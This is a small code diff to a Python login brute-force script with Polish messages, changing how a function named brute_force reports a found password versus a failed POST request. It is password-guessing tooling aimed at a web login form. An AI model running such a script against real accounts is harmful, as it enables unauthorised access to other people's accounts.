@@ -10,11 +10,12 @@ def brute_force(username, password):
     }
     response = requests.post(url, data=payload)
 
-    if response.status_code == 200:
-        print("Znaleziono hasło:", password)
-        return True
-    else:
+    if response.status_code != 200:
+        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
         return False
+
+    print("Znaleziono hasło:", password)
+    return True
 
 def main():
     username = "example@example.com"
@@ -29,3 +30,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
